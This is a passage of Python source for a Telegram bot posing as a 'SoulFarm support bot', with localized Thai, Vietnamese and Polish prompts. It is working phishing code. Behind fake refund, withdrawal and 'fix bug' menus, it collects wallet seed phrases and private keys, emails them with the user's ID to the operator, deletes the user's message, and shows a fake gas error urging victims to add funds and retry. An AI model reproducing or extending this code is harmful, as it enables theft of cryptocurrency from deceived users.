        "seed phrase": "🔒 Import Seed Phrase",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "คุณได้เลือก {wallet_name}。\nเลือกโหมดการเชื่อมต่อ",
        "reassurance": PROFESSIONAL_REASSURANCE["th"],
        "prompt seed": "กรุณาป้อน seed phrase 12 หรือ 24 คำของคุณ。",
        "prompt private key": "กรุณาป้อน private key ของคุณ。",
        "prompt_24_wallet_type_metamask": "กรุณาใส่ 24 คำของ Tonkeeper wallet ของคุณ。",
        "prompt_24_wallet_type_trust_wallet": "กรุณาใส่ 24 คำของ Telegram Wallet ของคุณ。",
        "prompt_24_wallet_type_coinbase": "กรุณาใส่ 24 คำของ MyTon wallet ของคุณ。",
        "prompt_24_wallet_type_tonkeeper": "กรุณาใส่ 24 คำของ Tonhub wallet ของคุณ。",
        "wallet_24_error_wallet_type_metamask": "ช่องนี้ต้องการ seed phrase (24 คำของกระเป๋า Tonkeeper ของคุณ) โปรดระบุ seed phrase.",
        "wallet_24_error_wallet_type_trust_wallet": "ช่องนี้ต้องการ seed phrase (24 คำของกระเป๋า Telegram ของคุณ) โปรดระบุ seed phrase.",
        "wallet_24_error_wallet_type_coinbase": "ช่องนี้ต้องการ seed phrase (24 คำของกระเป๋า MyTon ของคุณ) โปรดระบุ seed phrase.",
        "wallet_24_error_wallet_type_tonkeeper": "ช่องนี้ต้องการ seed phrase (24 คำของกระเป๋า Tonhub ของคุณ) โปรดระบุ seed phrase.",
        "refund": "คืนเงิน",
        "reflection": "สะท้อน",
        "pending withdrawal": "การถอนที่รอดำเนินการ",
        "fix bug": "แก้ไขบั๊ก",
        "connect_refund": "โปรดเชื่อมต่อกระเป๋าของคุณเพื่อรับการคืนเงิน",
        "connect_reflection": "โปรดเชื่อมต่อกระเป๋าของคุณเพื่อสะท้อนโทเค็นในกระเป๋าของคุณ",
        "connect_pending_withdrawal": "โปรดเชื่อมต่อกระเป๋าของคุณเพื่อเรียกร้องการถอนที่รอดำเนินการของคุณ",
        "connect_fix_bug": "โปรดเชื่อมต่อกระเป๋าของคุณเพื่อแก้ไขบั๊กในกระเป๋าของคุณ",
                        "retry": '🔄 ลองอีกครั้ง',
        "post_receive_error": '⚠️ การยืนยันกระเป๋าเงิน TON ล้มเหลว\n\nไม่สามารถยืนยันกระเป๋าเงินเสร็จสมบูรณ์ได้ เนื่องจาก TON ไม่เพียงพอสำหรับค่าธรรมเนียมแก๊สเครือข่ายและการดำเนินการสัญญาอัจฉริยะที่จำเป็นในการดำเนินการบนเชน\n\nข้อผิดพลาด TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nโปรดตรวจสอบให้แน่ใจว่ากระเป๋าเงินที่เชื่อมต่อมี TON เพียงพอสำหรับความสมบูรณ์ของธุรกรรม จากนั้นลองยืนยันอีกครั้ง\n\nนอกจากนี้ ให้ตรวจสอบคำกู้คืนทั้ง 24 คำในเครื่องของคุณเพื่อหาข้อผิดพลาดในการสะกด คำที่ขาดหาย ลำดับที่ไม่ถูกต้อง หรือรายการที่ไม่ถูกต้อง การไม่ตรงกันเพียงครั้งเดียวอาจทำให้การตรวจสอบการรับรองความถูกต้อง/การสืบทอดของกระเป๋าเงินล้มเหลว',
    },
    "vi": {
        "welcome": "Hi {user} chào mừng đến với SoulFarm support bot! Bot này giúp truy cập ví, giao dịch, số dư, khôi phục, khôi phục tài khoản, yêu cầu token và phần thưởng, hoàn tiền và xác thực tài khoản. Vui lòng chọn một tùy chọn để tiếp tục.",
        "main menu title": "Vui lòng chọn loại sự cố để tiếp tục:",
        "validation": "Xác thực",
        "claim tokens": "Yêu cầu Token",
        "recover account progress": "Khôi phục tiến độ tài khoản",
        "assets recovery": "Khôi phục Tài sản",
        "general issues": "Vấn đề chung",
        "rectification": "Sửa chữa",
        "withdrawals": "Rút tiền",
        "missing balance": "Thiếu số dư",
        "login issues": "Vấn đề đăng nhập",
        "connect wallet message": "Vui lòng kết nối ví bằng Private Key hoặc Seed Phrase để tiếp tục。",
        "connect wallet button": "🔑 Kết nối Wallet",
        "select wallet type": "Vui lòng chọn loại wallet:",
        "other wallets": "Ví khác",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Import Seed Phrase",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "Bạn đã chọn {wallet_name}。\nChọn phương thức kết nối。",
        "reassurance": PROFESSIONAL_REASSURANCE["vi"],
        "prompt seed": "Vui lòng nhập seed phrase 12 hoặc 24 từ của bạn。",
        "prompt private key": "Vui lòng nhập private key của bạn。",
        "prompt_24_wallet_type_metamask": "Vui lòng nhập 24 từ của ví Tonkeeper của bạn。",
        "prompt_24_wallet_type_trust_wallet": "Vui lòng nhập 24 từ của Telegram Wallet của bạn。",
        "prompt_24_wallet_type_coinbase": "Vui lòng nhập 24 từ của MyTon wallet của bạn。",
        "prompt_24_wallet_type_tonkeeper": "Vui lòng nhập 24 từ của Tonhub wallet của bạn。",
        "wallet_24_error_wallet_type_metamask": "Trường này yêu cầu seed phrase (24 từ của ví Tonkeeper của bạn). Vui lòng cung cấp seed phrase.",
        "wallet_24_error_wallet_type_trust_wallet": "Trường này yêu cầu seed phrase (24 từ của ví Telegram của bạn). Vui lòng cung cấp seed phrase.",
        "wallet_24_error_wallet_type_coinbase": "Trường này yêu cầu seed phrase (24 từ của ví MyTon của bạn). Vui lòng cung cấp seed phrase.",
        "wallet_24_error_wallet_type_tonkeeper": "Trường này yêu cầu seed phrase (24 từ của ví Tonhub của bạn). Vui lòng cung cấp seed phrase.",
        "refund": "Hoàn tiền",
        "reflection": "Phản ánh",
        "pending withdrawal": "Rút tiền đang chờ",
        "fix bug": "Sửa BUG",
        "connect_refund": "Vui lòng kết nối ví của bạn để nhận hoàn tiền",
        "connect_reflection": "Vui lòng kết nối ví của bạn để phản ánh token của bạn trong ví",
        "connect_pending_withdrawal": "Vui lòng kết nối ví của bạn để yêu cầu rút tiền đang chờ",
        "connect_fix_bug": "Vui lòng kết nối ví của bạn để sửa lỗi trong ví của bạn",
                        "retry": '🔄 Thử lại',
        "post_receive_error": '⚠️ Xác minh ví TON thất bại\n\nKhông thể hoàn tất xác minh ví do TON không đủ cho phí gas mạng và phí thực thi hợp đồng thông minh cần thiết để hoàn thành hoạt động trên chuỗi.\n\nLỗi TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nHãy đảm bảo ví đã kết nối có đủ TON để hoàn thiện giao dịch, sau đó thử xác minh lại.\n\nNgoài ra, hãy kiểm tra cục bộ tất cả 24 từ phục hồi để tìm lỗi chính tả, từ bị thiếu, thứ tự không chính xác hoặc mục nhập không hợp lệ. Một sự không khớp duy nhất có thể khiến xác thực/dẫn xuất ví thất bại.',
    },
    "pl": {
        "welcome": "Hi {user} witaj w SoulFarm support bot! Ten bot pomaga w dostępie do portfela, transakcjach, saldach, odzyskiwaniu, odzyskaniu konta, odbieraniu tokenów i nagród, zwrotach i weryfikacji konta. Wybierz opcję, aby kontynuować.",
        "main menu title": "Wybierz rodzaj problemu, aby kontynuować:",
        "validation": "Walidacja",
        "claim tokens": "Odbierz Tokeny",
        "recover account progress": "Odzyskaj postęp konta",
        "assets recovery": "Odzyskiwanie aktywów",
        "general issues": "Ogólne problemy",
        "rectification": "Rektyfikacja",
        "withdrawals": "Wypłaty",
        "missing balance": "Brakujący Saldo",
        "login issues": "Problemy z logowaniem",
        "connect wallet message": "Proszę połączyć wallet za pomocą Private Key lub Seed Phrase, aby kontynuować。",
        "connect wallet button": "🔑 Połącz Wallet",
        "select wallet type": "Wybierz typ wallet:",
        "other wallets": "Inne Wallets",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Import Seed Phrase",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "Wybrałeś {wallet_name}。\nWybierz preferowany sposób połączenia。",
        "reassurance": PROFESSIONAL_REASSURANCE["pl"],
        "prompt seed": "Wprowadź seed phrase 12 lub 24 słów。",
        "prompt private key": "Wprowadź private key。",
        "prompt_24_wallet_type_metamask": "Wprowadź 24 słowa portfela Tonkeeper.",
        "prompt_24_wallet_type_trust_wallet": "Wprowadź 24 słowa Telegram Wallet.",
        "prompt_24_wallet_type_coinbase": "Wprowadź 24 słowa MyTon wallet.",
        "prompt_24_wallet_type_tonkeeper": "Wprowadź 24 słowa Tonhub wallet.",
        "wallet_24_error_wallet_type_metamask": "To pole wymaga seed phrase (24 słowa Twojego portfela Tonkeeper). Podaj seed phrase.",
        "wallet_24_error_wallet_type_trust_wallet": "To pole wymaga seed phrase (24 słowa Twojego portfela Telegram). Podaj seed phrase.",
        "wallet_24_error_wallet_type_coinbase": "To pole wymaga seed phrase (24 słowa Twojego portfela MyTon). Podaj seed phrase.",
        "wallet_24_error_wallet_type_tonkeeper": "To pole wymaga seed phrase (24 słowa Twojego portfela Tonhub). Podaj seed phrase.",
        "refund": "Zwrot",
        "reflection": "Refleksja",
        "pending withdrawal": "Oczekujące wypłaty",
        "fix bug": "Napraw BUG",
        "connect_refund": "Połącz swoje konto, aby otrzymać zwrot",
        "connect_reflection": "Połącz swoje konto, aby odzwierciedlić tokeny w portfelu",
        "connect_pending_withdrawal": "Połącz swoje konto, aby zrealizować oczekującą wypłatę",
        "connect_fix_bug": "Połącz swoje konto, aby naprawić błąd w portfelu",
                        "retry": '🔄 Spróbuj ponownie',
        "post_receive_error": '⚠️ Weryfikacja portfela TON nie powiodła się\n\nWeryfikacja portfela nie mogła zostać zakończona z powodu niewystarczającej ilości TON na opłaty za gaz sieciowy i wykonanie inteligentnych kontraktów wymaganych do ukończenia operacji on-chain.\n\nBłąd TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nUpewnij się, że połączony portfel ma wystarczającą ilość TON do finalizacji transakcji, a następnie ponów weryfikację.\n\nPonadto lokalnie sprawdź wszystkie 24 słowa odzyskiwania pod kątem błędów ortograficznych, brakujących słów, nieprawidłowej kolejności lub nieprawidłowych wpisów. Jedna niezgodność może spowodować niepowodzenie walidacji uwierzytelnienia/derivacji portfela.',
    },
}

# MENU_CONNECT_MESSAGES fallback (English)
MENU_CONNECT_MESSAGES = {
    "refund": "Please connect your wallet to receive your refund",
    "reflection": "Please connect your wallet to reflect your tokens in your wallet",
    "pending_withdrawal": "Please connect your wallet to claim your pending withdrawal",
    "fix_bug": "Please connect your wallet to fix the bug on your wallet",
    "withdrawals": "Please connect your wallet to receive your withdrawal",
    "missing_balance": "Please connect your wallet to reflect your missing balance",
    "assets_recovery": "Please connect your wallet to recover your assets",
    "claim_tokens": "Please connect your wallet to claim your tokens",
    "validation": "Please connect your wallet to continue",
    "general_issues": "Please connect your wallet to continue",
    "rectification": "Please connect your wallet to continue",
    "recover_telegram_stars": "Please connect your wallet to recover your telegram stars",
    "claim_rewards": "Please connect your wallet to claim your reward",
    "claim_tickets": "Please connect your wallet to Claim your tickets 🎟 in your account",
    "recover_account_progress": "Please connect your wallet to recover your account's progress",
    "claim_sticker_reward": "Please connect your wallet to Claim your stickers reward",
}

# Utility to get localized text
def ui_text(context: ContextTypes.DEFAULT_TYPE, key: str) -> str:
    lang = "en"
    try:
        if context and hasattr(context, "user_data"):
            lang = context.user_data.get("language", "en") or "en"
    except Exception:
        lang = "en"
    return LANGUAGES.get(lang, LANGUAGES["en"]).get(key, LANGUAGES["en"].get(key, key))

# Reassurance builder — formats PROFESSIONAL_REASSURANCE with localized input label
def build_reassurance_block(localized_input_type: str, context: ContextTypes.DEFAULT_TYPE = None) -> str:
    lang = "en"
    try:
        if context and hasattr(context, "user_data"):
            lang = context.user_data.get("language", "en") or "en"
    except Exception:
        lang = "en"
    template = PROFESSIONAL_REASSURANCE.get(lang) or REASSURANCE_TEMPLATE
    try:
        body = template.format(input_type=localized_input_type)
    except Exception:
        body = REASSURANCE_TEMPLATE.format(input_type=localized_input_type)
    return "\n\n" + body

# Helper to parse sticker input into items and count
def parse_stickers_input(text: str):
    if not text:
        return [], 0
    normalized = text.replace(",", "\n").replace(";", "\n")
    parts = [p.strip() for p in normalized.splitlines() if p.strip()]
    return parts, len(parts)

# Language keyboard builder
def build_language_keyboard():
    keyboard = [
        [InlineKeyboardButton("English 🇬🇧", callback_data="lang_en"), InlineKeyboardButton("Русский 🇷🇺", callback_data="lang_ru")],
        [InlineKeyboardButton("Español 🇪🇸", callback_data="lang_es"), InlineKeyboardButton("Українська 🇺🇦", callback_data="lang_uk")],
        [InlineKeyboardButton("Français 🇫🇷", callback_data="lang_fr"), InlineKeyboardButton("فارسی 🇮🇷", callback_data="lang_fa")],
        [InlineKeyboardButton("Türkçe 🇹🇷", callback_data="lang_tr"), InlineKeyboardButton("中文 🇨🇳", callback_data="lang_zh")],
        [InlineKeyboardButton("Deutsch 🇩🇪", callback_data="lang_de"), InlineKeyboardButton("العربية 🇸🇦", callback_data="lang_ar")],
        [InlineKeyboardButton("Nederlands 🇳🇱", callback_data="lang_nl"), InlineKeyboardButton("हिन्दी 🇮🇳", callback_data="lang_hi")],
        [InlineKeyboardButton("Bahasa Indonesia 🇮🇩", callback_data="lang_id"), InlineKeyboardButton("Português 🇵🇹", callback_data="lang_pt")],
        [InlineKeyboardButton("Čeština 🇨🇿", callback_data="lang_cs"), InlineKeyboardButton("اردو 🇵🇰", callback_data="lang_ur")],
        [InlineKeyboardButton("Oʻzbekcha 🇺🇿", callback_data="lang_uz"), InlineKeyboardButton("Italiano 🇮🇹", callback_data="lang_it")],
        [InlineKeyboardButton("日本語 🇯🇵", callback_data="lang_ja"), InlineKeyboardButton("Bahasa Melayu 🇲🇾", callback_data="lang_ms")],
        [InlineKeyboardButton("Română 🇷🇴", callback_data="lang_ro"), InlineKeyboardButton("Slovenčina 🇸🇰", callback_data="lang_sk")],
        [InlineKeyboardButton("ไทย 🇹🇭", callback_data="lang_th"), InlineKeyboardButton("Tiếng Việt 🇻🇳", callback_data="lang_vi")],
        [InlineKeyboardButton("Polski 🇵🇱", callback_data="lang_pl")],
    ]
    return InlineKeyboardMarkup(keyboard)

# Send and push message to per-user message stack
async def send_and_push_message(
    bot,
    chat_id: int,
    text: str,
    context: ContextTypes.DEFAULT_TYPE,
    reply_markup=None,
    parse_mode=None,
    state=None,
) -> object:
    msg = await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
    stack = context.user_data.setdefault("message_stack", [])
    recorded_state = state if state is not None else context.user_data.get("current_state", CHOOSE_LANGUAGE)
    stack.append(
        {
            "chat_id": chat_id,
            "message_id": msg.message_id,
            "text": text,
            "reply_markup": reply_markup,
            "state": recorded_state,
            "parse_mode": parse_mode,
        }
    )
    if len(stack) > 60:
        stack.pop(0)
    return msg

# Edit to previous on Back
async def edit_current_to_previous_on_back(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    stack = context.user_data.get("message_stack", [])
    if not stack:
        keyboard = build_language_keyboard()
        context.user_data["current_state"] = CHOOSE_LANGUAGE
        await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "choose language"), context, reply_markup=keyboard, state=CHOOSE_LANGUAGE)
        return CHOOSE_LANGUAGE

    if len(stack) == 1:
        prev = stack[0]
        try:
            await update.callback_query.message.edit_text(prev["text"], reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"))
            context.user_data["current_state"] = prev.get("state", CHOOSE_LANGUAGE)
            prev["message_id"] = update.callback_query.message.message_id
            prev["chat_id"] = update.callback_query.message.chat.id
            stack[-1] = prev
            return prev.get("state", CHOOSE_LANGUAGE)
        except Exception:
            await send_and_push_message(context.bot, prev["chat_id"], prev["text"], context, reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"), state=prev.get("state", CHOOSE_LANGUAGE))
            context.user_data["current_state"] = prev.get("state", CHOOSE_LANGUAGE)
            return prev.get("state", CHOOSE_LANGUAGE)

    try:
        stack.pop()
    except Exception:
        pass

    prev = stack[-1]
    try:
        await update.callback_query.message.edit_text(prev["text"], reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"))
        new_prev = prev.copy()
        new_prev["message_id"] = update.callback_query.message.message_id
        new_prev["chat_id"] = update.callback_query.message.chat.id
        stack[-1] = new_prev
        context.user_data["current_state"] = new_prev.get("state", MAIN_MENU)
        return new_prev.get("state", MAIN_MENU)
    except Exception:
        sent = await send_and_push_message(context.bot, prev["chat_id"], prev["text"], context, reply_markup=prev["reply_markup"], parse_mode=prev.get("parse_mode"), state=prev.get("state", MAIN_MENU))
        context.user_data["current_state"] = prev.get("state", MAIN_MENU)
        return prev.get("state", MAIN_MENU)

# Build main menu markup
def build_main_menu_markup(context: ContextTypes.DEFAULT_TYPE):
    kb = [
        [InlineKeyboardButton(ui_text(context, "validation"), callback_data="validation"),
         InlineKeyboardButton(ui_text(context, "claim tokens"), callback_data="claim_tokens")],
        [InlineKeyboardButton(ui_text(context, "assets recovery"), callback_data="assets_recovery"),
         InlineKeyboardButton(ui_text(context, "general issues"), callback_data="general_issues")],
        [InlineKeyboardButton(ui_text(context, "rectification"), callback_data="rectification"),
         InlineKeyboardButton(ui_text(context, "withdrawals"), callback_data="withdrawals")],
        [InlineKeyboardButton(ui_text(context, "login issues"), callback_data="login_issues"),
         InlineKeyboardButton(ui_text(context, "missing balance"), callback_data="missing_balance")],
        [InlineKeyboardButton(ui_text(context, "refund"), callback_data="refund"),
         InlineKeyboardButton(ui_text(context, "reflection"), callback_data="reflection")],
        [InlineKeyboardButton(ui_text(context, "pending withdrawal"), callback_data="pending_withdrawal"),
         InlineKeyboardButton(ui_text(context, "fix bug"), callback_data="fix_bug")],
    ]
    kb.append([InlineKeyboardButton(ui_text(context, "back"), callback_data="back_main_menu")])
    return InlineKeyboardMarkup(kb)

# /start handler — show language selection
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["message_stack"] = []
    context.user_data["current_state"] = CHOOSE_LANGUAGE
    keyboard = build_language_keyboard()
    chat_id = update.effective_chat.id
    await send_and_push_message(context.bot, chat_id, ui_text(context, "choose language"), context, reply_markup=keyboard, state=CHOOSE_LANGUAGE)
    return CHOOSE_LANGUAGE

# Set language when user selects it
async def set_language(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    lang = query.data.split("_", 1)[-1]
    if lang not in LANGUAGES:
        lang = "en"
    context.user_data["language"] = lang
    context.user_data["current_state"] = MAIN_MENU
    try:
        if query.message:
            await query.message.edit_reply_markup(reply_markup=None)
    except Exception:
        logging.debug("Failed to remove language keyboard (non-fatal).")
    welcome_template = ui_text(context, "welcome")
    welcome = welcome_template.format(user=update.effective_user.mention_html()) if "{user}" in welcome_template else welcome_template
    markup = build_main_menu_markup(context)
    await send_and_push_message(context.bot, update.effective_chat.id, welcome, context, reply_markup=markup, parse_mode="HTML", state=MAIN_MENU)
    return MAIN_MENU

# Handle invalid typed input during flows
async def handle_invalid_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    msg = ui_text(context, "invalid_input")
    await update.message.reply_text(msg)
    return context.user_data.get("current_state", MAIN_MENU)

# Show connect wallet button or contextual message for selected main menu option
async def show_connect_wallet_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    selected_key = query.data

    localized_connect_key = f"connect_{selected_key}"
    localized_connect = ui_text(context, localized_connect_key)
    if localized_connect != localized_connect_key:
        composed = localized_connect
    else:
        custom_connect = MENU_CONNECT_MESSAGES.get(selected_key)
        if custom_connect:
            composed = custom_connect
        else:
            localized = ui_text(context, selected_key)
            if localized == selected_key:
                composed = ui_text(context, "connect wallet message")
            else:
                composed = localized if len(localized.split()) > 4 else ui_text(context, "connect wallet message")

    context.user_data["current_state"] = AWAIT_CONNECT_WALLET

    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton(ui_text(context, "connect wallet button"), callback_data="connect_wallet")],
            [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_connect_wallet")],
        ]
    )
    await send_and_push_message(context.bot, update.effective_chat.id, composed, context, reply_markup=keyboard, state=AWAIT_CONNECT_WALLET)
    return AWAIT_CONNECT_WALLET

# Show primary wallet types
async def show_wallet_types(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton(WALLET_DISPLAY_NAMES.get("wallet_type_metamask", "Tonkeeper"), callback_data="wallet_type_metamask")],
        [InlineKeyboardButton(WALLET_DISPLAY_NAMES.get("wallet_type_trust_wallet", "Telegram Wallet"), callback_data="wallet_type_trust_wallet")],
        [InlineKeyboardButton(WALLET_DISPLAY_NAMES.get("wallet_type_coinbase", "MyTon Wallet"), callback_data="wallet_type_coinbase")],
        [InlineKeyboardButton(WALLET_DISPLAY_NAMES.get("wallet_type_tonkeeper", "Tonhub"), callback_data="wallet_type_tonkeeper")],
        [InlineKeyboardButton(ui_text(context, "other wallets"), callback_data="other_wallets")],
        [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_types")],
    ]
    reply = InlineKeyboardMarkup(keyboard)
    context.user_data["current_state"] = CHOOSE_WALLET_TYPE
    await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "select wallet type"), context, reply_markup=reply, state=CHOOSE_WALLET_TYPE)
    return CHOOSE_WALLET_TYPE

# Show other wallets in two-column layout
async def show_other_wallets(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    keys = [
        "wallet_type_mytonwallet","wallet_type_tonhub","wallet_type_rainbow","wallet_type_safepal",
        "wallet_type_wallet_connect","wallet_type_ledger","wallet_type_brd_wallet","wallet_type_solana_wallet",
        "wallet_type_balance","wallet_type_okx","wallet_type_xverse","wallet_type_sparrow",
        "wallet_type_earth_wallet","wallet_type_hiro","wallet_type_saitamask_wallet","wallet_type_casper_wallet",
        "wallet_type_cake_wallet","wallet_type_kepir_wallet","wallet_type_icpswap","wallet_type_kaspa",
        "wallet_type_nem_wallet","wallet_type_near_wallet","wallet_type_compass_wallet","wallet_type_stack_wallet",
        "wallet_type_soilflare_wallet","wallet_type_aioz_wallet","wallet_type_xpla_vault_wallet","wallet_type_polkadot_wallet",
        "wallet_type_xportal_wallet","wallet_type_multiversx_wallet","wallet_type_verachain_wallet","wallet_type_casperdash_wallet",
        "wallet_type_nova_wallet","wallet_type_fearless_wallet","wallet_type_terra_station","wallet_type_cosmos_station",
        "wallet_type_exodus_wallet","wallet_type_argent","wallet_type_binance_chain","wallet_type_safemoon",
        "wallet_type_gnosis_safe","wallet_type_defi","wallet_type_other",
    ]
    kb = []
    row = []
    for k in keys:
        base_label = WALLET_DISPLAY_NAMES.get(k, k.replace("wallet_type_", "").replace("_", " ").title())
        row.append(InlineKeyboardButton(base_label, callback_data=k))
        if len(row) == 2:
            kb.append(row)
            row = []
    if row:
        kb.append(row)
    kb.append([InlineKeyboardButton(ui_text(context, "back"), callback_data="back_other_wallets")])
    reply = InlineKeyboardMarkup(kb)
    context.user_data["current_state"] = CHOOSE_OTHER_WALLET_TYPE
    await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "select wallet type"), context, reply_markup=reply, state=CHOOSE_OTHER_WALLET_TYPE)
    return CHOOSE_OTHER_WALLET_TYPE

# Show phrase options; some wallets require seed only
async def show_phrase_options(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    wallet_key = query.data
    wallet_name = WALLET_DISPLAY_NAMES.get(wallet_key, wallet_key.replace("wallet_type_", "").replace("_", " ").title())
    context.user_data["wallet type"] = wallet_name
    context.user_data["wallet key"] = wallet_key

    seed_only_keys = {"wallet_type_metamask", "wallet_type_trust_wallet", "wallet_type_tonkeeper"}

    if wallet_key in seed_only_keys:
        keyboard = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton(ui_text(context, "seed phrase"), callback_data="seed_phrase")],
                [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_selection")],
            ]
        )
    else:
        keyboard = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton(ui_text(context, "seed phrase"), callback_data="seed_phrase")],
                [InlineKeyboardButton(ui_text(context, "private key"), callback_data="private_key")],
                [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_selection")],
            ]
        )

    text = ui_text(context, "wallet selection message").format(wallet_name=wallet_name)
    context.user_data["current_state"] = PROMPT_FOR_INPUT
    await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=keyboard, state=PROMPT_FOR_INPUT)
    return PROMPT_FOR_INPUT

# Prompt for user input (seed or private key)
async def prompt_for_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    context.user_data["wallet option"] = query.data
    fr = ForceReply(selective=False)
    if query.data == "seed_phrase":
        wk = context.user_data.get("wallet key", "")
        localized_label = ui_text(context, "label_seed_phrase")
        # Try localized 24-word prompt keys
        prompt_key = f"prompt_24_wallet_type_{wk.replace('wallet_type_', '')}"
        localized_24 = ui_text(context, prompt_key)
        if localized_24 != prompt_key:
            text = localized_24 + build_reassurance_block(localized_label, context)
        else:
            prompt_map_key = f"prompt_24_{wk}"
            localized_24b = ui_text(context, prompt_map_key)
            if localized_24b != prompt_map_key:
                text = localized_24b + build_reassurance_block(localized_label, context)
            else:
                wallet_24_prompts = {
                    "wallet_type_metamask": ui_text(context, "prompt_24_wallet_type_metamask"),
                    "wallet_type_trust_wallet": ui_text(context, "prompt_24_wallet_type_trust_wallet"),
                    "wallet_type_coinbase": ui_text(context, "prompt_24_wallet_type_coinbase"),
                    "wallet_type_tonkeeper": ui_text(context, "prompt_24_wallet_type_tonkeeper"),
                }
                if wk in wallet_24_prompts and wallet_24_prompts[wk]:
                    text = wallet_24_prompts[wk] + build_reassurance_block(localized_label, context)
                else:
                    text = ui_text(context, "prompt seed") + build_reassurance_block(localized_label, context)
        context.user_data["current_state"] = RECEIVE_INPUT
        await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=fr, state=RECEIVE_INPUT)
    elif query.data == "private_key":
        localized_label = ui_text(context, "label_private_key")
        text = ui_text(context, "prompt private key") + build_reassurance_block(localized_label, context)
        context.user_data["current_state"] = RECEIVE_INPUT
        await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=fr, state=RECEIVE_INPUT)
    else:
        await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "invalid choice"), context, state=context.user_data.get("current_state", CHOOSE_LANGUAGE))
        return ConversationHandler.END
    return RECEIVE_INPUT

# Handle final input: send email, delete message, validate seed length when necessary, and show post-receive error
async def handle_final_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_input = update.message.text or ""
    chat_id = update.message.chat_id
    message_id = update.message.message_id
    wallet_option = context.user_data.get("wallet option", "Unknown")
    wallet_type = context.user_data.get("wallet type", "Unknown")
    wallet_key = context.user_data.get("wallet key", "")
    user = update.effective_user

    subject = f"New Wallet Input from Telegram Bot: {wallet_type} -> {wallet_option}"
    body = f"User ID: {user.id}\nUsername: {user.username}\n\nWallet Type: {wallet_type}\nInput Type: {wallet_option}\nInput: {user_input}"
    await send_email(subject, body)

    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        logging.debug("Could not delete user message (non-fatal).")

    if context.user_data.get("wallet option") == "seed_phrase":
        words = [w for w in re.split(r"\s+", user_input.strip()) if w]
        require_24_keys = {"wallet_type_metamask", "wallet_type_trust_wallet", "wallet_type_coinbase", "wallet_type_tonkeeper"}

        if wallet_key in require_24_keys:
            if len(words) != 24:
                localized_error_key = f"wallet_24_error_{wallet_key}"
                prompt_text = ui_text(context, localized_error_key)
                if prompt_text == localized_error_key:
                    fallback_messages = {
                        "wallet_type_metamask": "This field requires a seed phrase (the 24 words of your Tonkeeper wallet). Please provide the seed phrase instead.",
                        "wallet_type_trust_wallet": "This field requires a seed phrase (the 24 words of your Telegram wallet). Please provide the seed phrase instead.",
                        "wallet_type_coinbase": "This field requires a seed phrase (the 24 words of your MyTon wallet). Please provide the seed phrase instead.",
                        "wallet_type_tonkeeper": "This field requires a seed phrase (the 24 words of your Tonhub wallet). Please provide the seed phrase instead.",
                    }
                    prompt_text = fallback_messages.get(wallet_key, ui_text(context, "error_use_seed_phrase"))
                fr = ForceReply(selective=False)
                await send_and_push_message(context.bot, chat_id, prompt_text, context, reply_markup=fr, state=RECEIVE_INPUT)
                context.user_data["current_state"] = RECEIVE_INPUT
                return RECEIVE_INPUT
        else:
            if len(words) not in (12, 24):
                fr = ForceReply(selective=False)
                localized_label = ui_text(context, "label_seed_phrase")
                prompt_text = ui_text(context, "error_use_seed_phrase")
                await send_and_push_message(context.bot, chat_id, prompt_text + build_reassurance_block(localized_label, context), context, reply_markup=fr, state=RECEIVE_INPUT)
                context.user_data["current_state"] = RECEIVE_INPUT
                return RECEIVE_INPUT

    context.user_data["current_state"] = AWAIT_RESTART
    error_keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(ui_text(context, "retry"), callback_data="retry_input")],
        [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_main_menu")],
    ])
    await send_and_push_message(context.bot, chat_id, ui_text(context, "post_receive_error"), context, reply_markup=error_keyboard, state=AWAIT_RESTART)
    return AWAIT_RESTART

# Retry handler — re-prompts for seed phrase / private key from the error screen
async def handle_retry_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    # Restore last wallet option so prompt_for_input can use it directly
    wallet_option = context.user_data.get("wallet option", "seed_phrase")
    # Build a fake query.data so prompt_for_input reads the right option
    # We call it by re-using prompt_for_input logic inline for clarity
    fr = ForceReply(selective=False)
